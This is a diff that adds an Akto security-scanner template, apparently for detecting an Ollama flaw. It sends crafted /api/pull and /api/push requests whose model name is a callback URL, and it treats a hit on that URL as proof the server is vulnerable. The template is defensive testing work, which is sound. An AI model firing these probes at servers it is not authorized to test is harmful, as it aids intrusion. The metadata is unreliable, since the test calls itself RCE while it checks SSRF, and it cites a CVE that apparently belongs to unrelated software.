@@ -1,0 +1,62 @@
+id: OLLAMA_RCE
+info:
+  name: "Ollama Remote Code Execution Test"
+  description: "The Ollama Remote Code Execution (RCE) Test assesses the security of Ollama, a platform used for running and managing machine learning models, to check for potential vulnerabilities that could allow remote execution of arbitrary code. If exploited, an attacker could execute malicious commands on the server, gaining control of the system or affecting its functionality. This test helps identify flaws in input validation, insecure configurations, or improper handling of user-provided data that could lead to an RCE vulnerability. Securing input validation and applying proper access controls are key to mitigating such risks."
+  details:  "The Ollama Remote Code Execution (RCE) Test focuses on identifying potential vulnerabilities within Ollama's platform that could allow an attacker to remotely execute arbitrary code. This could be triggered by exploiting weaknesses in how user inputs or model interactions are processed, such as lack of sanitization or improper privilege management. An attacker gaining RCE access could manipulate the server to run malicious scripts, access sensitive data, or disrupt the service. To mitigate this risk, securing input validation, applying least privilege principles, and ensuring that all user inputs are properly sanitized are essential."
+  impact: "The impact of an Ollama Remote Code Execution (RCE) vulnerability is severe, as it allows an attacker to execute arbitrary code on the server, potentially gaining full control over the system. This could lead to data theft, system compromise, or unauthorized access to sensitive information. Exploiting the vulnerability could also result in service disruption, manipulation of machine learning models, or launching further attacks on other systems within the network. Securing input handling and enforcing strict access controls are crucial to preventing such exploits."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: OLLAMA_RCE
+  severity: MEDIUM
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2020-9484
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+
+execute:
+  type: multiple
+  requests:
+    - req:
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - modify_url: "/api/pull"
+      - modify_method: POST
+      - replace_body: '{"name": "https://test-services.akto.io/${random_uuid}", "insecure": true}'
+      - validate:
+          ssrf_url_hit: ${random_uuid}
+      - success: x2
+      - failure: exit
+    - req:
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - modify_url: "/api/push"
+      - modify_method: POST
+      - replace_body: '{"name": "https://test-services.akto.io/${random_uuid}", "insecure": true}'
+      - validate:
+          ssrf_url_hit: ${random_uuid}
+          response_payload:
+            contains_all:
+              - "retrieving manifest"
+          response_headers:
+            for_one:
+              key:
+                eq: content-type
+              value:
+                eq: "application/x-ndjson"
+      - success: vulnerable
+      - failure: exit
+
